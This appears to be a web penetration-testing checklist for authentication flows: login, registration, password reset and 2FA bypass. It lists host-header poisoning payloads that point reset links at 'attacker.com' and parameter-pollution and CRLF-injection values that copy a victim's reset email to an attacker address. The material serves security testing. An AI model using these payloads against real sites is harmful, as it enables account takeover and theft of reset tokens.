# Authentication Class

The bullets

- Authentication
    - Fuzz to discover hidden parameter, many open redirect and XSS here
    - Response manipulation, it works on legacy web application, sometimes leads to a new page to test
    - Login with an email address, try to register by a same with small change
        - `myemail@email.com` → `my%00email@email.com`
        - `myemail@email.com` → `my.email@email.com`
        - `myemail@email.com` → `my.email+123@email.com`
    - Change the Email address, use the old code to verify
    - Send HTTP request to the registration endpoint while authenticated and fuzz for hidden parameter
- Registration
    - Fuzz to discover hidden parameter, many open redirect and XSS
    - Register with special accounts, such as `noreplay@github.com` or `support@company.com`
- Forget password
- [Reset/Forget Password](https://www.notion.so/Reset-Forget-Password-e7d42ed48bdf4b918ad707b2d4d815b8?pvs=21)
    - Fuzz to discover hidden params
    - Change the `host` header in the forgot password HTTP request
    
    ```
    #0-- Host: attacker.com
    #1-- Host:target.com
    #1-- Host:attacker.com
    #2-- Host: attacker.com/target.com
    #3-- X-Forwarded-Host: attacker.com --> add this bellow host headet
    X-Host: attacker.com
    ```
    
    - Add `referrer` and `origin` too
    - Collect the tokens for further analysis
    - Try parameter pollution, works here
    
    ```jsx
    email=victim@gmail.com&email=attacker@gmail.com
    email=victim@gmail.com%20email=attacker@gmail.com
    email=victim@gmail.com|email=attacker@gmail.com
    email="victim@gmail.com%0a%0dcc:email=attacker@gmail.com
    email="victim@gmail.com%0a%0dbcc:email=attacker@gmail.com
    email="victim@gmail.com",email="attacker@gmail.com
    {"email": ["victim@gmail.com","attacker@gmail.com"]}
    ```
    
    - Check if password reset link is not expired (low)
    - 2 factor authentication
- Response manipulation, e.g. change param value from `false` to `true`
- Login with the credentials, send request to all features without performing 2FA
    - make request to an API which returns user’s information
    - make request to update user’s information